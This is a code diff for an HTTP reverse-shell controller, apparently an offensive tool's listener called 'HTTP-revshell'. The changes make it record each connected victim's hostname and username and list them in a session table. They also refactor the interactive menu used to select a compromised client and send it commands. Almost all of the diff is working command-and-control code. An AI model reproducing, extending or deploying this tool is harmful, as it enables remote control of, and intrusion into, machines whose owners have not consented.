@@ -33,8 +33,8 @@ class myHandler(BaseHTTPRequestHandler):
         html = "<html><body><h1>It Works!</h1></body></html>"
         client = self.client_address[0]
         
-        self.controlNewClients(client)
         result, parser_type, json_response, color = self.parseResult()
+        self.controlNewClients(client, json_response)
         pwd = self.getPwd(json_response)
 
         if client == CURRENT_CLIENT:
@@ -63,16 +63,19 @@ class myHandler(BaseHTTPRequestHandler):
             self.sendCommand(command, html)
         return
         
-    def controlNewClients(self, client):
+    def controlNewClients(self, client, json_response):
         if (client not in CLIENT_DICT):
+            hostname = base64.b64decode(json_response["hostname"]).decode('utf-8')
+            username = base64.b64decode(json_response["cuser"]).decode('utf-8')
             if len(CLIENT_DICT) == 0:
-                CLIENT_DICT[client] = 1
+                CLIENT_DICT[client] = {"session":1, "hostname":hostname, "username":username}
             else:
-                CLIENT_DICT[client] = list(CLIENT_DICT.items())[-1][1] + 1
+                CLIENT_DICT[client] = {"session":list(CLIENT_DICT.items())[-1][1]["session"] + 1, "hostname":hostname, "username":username}
 
         if len(CLIENT_DICT) == 1:
             global CURRENT_CLIENT
-            CURRENT_CLIENT = str(list(CLIENT_DICT.keys())[list(CLIENT_DICT.values()).index(int(next(iter(CLIENT_DICT.values()))))])
+            #CURRENT_CLIENT = str(list(CLIENT_DICT.keys())[list(CLIENT_DICT.values()).index(int(next(iter(CLIENT_DICT.values()))))])
+            CURRENT_CLIENT = list(CLIENT_DICT.keys())[0] 
 
     def parseResult(self):
         test_data = self.rfile.read(int(self.headers['Content-Length']))
@@ -257,8 +260,44 @@ class Certificate():
 def handler(signum, frame):
     pass
 
-def main():
+def construct_menu(menu, server):
+    if menu[0] == "sessions":
+        #server.handle_request()
+        print(colored("------------------------------------------------------------------", "green"))
+        print(colored("Session\t\tIP\t\tUsername\tHostname", "green"))
+        for client in CLIENT_DICT:
+            print(colored("{}\t\t{}\t{}\t{}".format(CLIENT_DICT[client]["session"], client, CLIENT_DICT[client]["username"], CLIENT_DICT[client]["hostname"]), "green"))
+        print(colored("------------------------------------------------------------------", "green"))
+    
+    if menu[0] == "exit":
+        server.server_close()
+        exit(0)
+    
+    if menu[0] == "interact":
+        if len(CLIENT_DICT) == 0:
+            print(colored("[!] Sorry, there are no clients!", "red"))
+        else:
+            try:
+                global CURRENT_CLIENT
+                for client in list(CLIENT_DICT.keys()):
+                    if CLIENT_DICT[client]["session"] == int(menu[1]):
+                        CURRENT_CLIENT = client
+                while True:
+                    global KEY_PULSED
+                    if KEY_PULSED:
+                        KEY_PULSED = False
+                        break
+                    request, client_address = server.get_request()
 
+                    if CURRENT_CLIENT == client_address[0]:
+                        if server.verify_request(request,client_address):
+                            server.process_request(request,client_address)
+                    else:
+                        server.finish_request(request, client_address)
+            except ValueError:
+                print (colored("[!] Session number {} doesn't exist".format(menu[1]), "red"))
+
+if __name__ == "__main__":
     banner = """
 ██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
 ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
@@ -290,43 +329,9 @@ def main():
 
         server.handle_request()
         while True:
-            menu = input(colored("\nHTTP-revshell> ", "yellow"))
-            menu = menu.split(" ")
-
-            if menu[0] == "sessions":
-                #server.handle_request()
-                
-                print(colored("--------------------------------------------------------", "green"))
-                print(colored("Session\t\tIP", "green"))
-                for client in CLIENT_DICT:
-                    print(colored("{}\t\t{}".format(CLIENT_DICT[client], client), "green"))
-                print(colored("--------------------------------------------------------", "green"))
-            if menu[0] == "exit":
-                server.server_close()
-                exit(0)
-            if menu[0] == "interact":
-                if len(CLIENT_DICT) == 0:
-                    print(colored("[!] Sorry, there are no clients!", "red"))
-                else:
-                    try:
-                        global CURRENT_CLIENT
-                        CURRENT_CLIENT = str(list(CLIENT_DICT.keys())[list(CLIENT_DICT.values()).index(int(menu[1]))])
-                        while True:
-                            global KEY_PULSED
-                            if KEY_PULSED:
-                                KEY_PULSED = False
-                                break
-                            request, client_address = server.get_request()
-                            #print ("CURRENT CLIENT --> {}".format(CURRENT_CLIENT))
-                            if CURRENT_CLIENT == client_address[0]:
-                                if server.verify_request(request,client_address):
-                                    server.process_request(request,client_address)
-                            else:
-                                server.finish_request(request, client_address)
-                    except ValueError:
-                        print (colored("[!] Session number {} doesn't exist".format(menu[1]), "red"))
+            menu = input(colored("\nHTTP-revshell> ", "yellow")).split(" ")
+            construct_menu(menu, server)
+            
     except KeyboardInterrupt:
         print (' received, shutting down the web server')
         server.server_close()
-
-main()
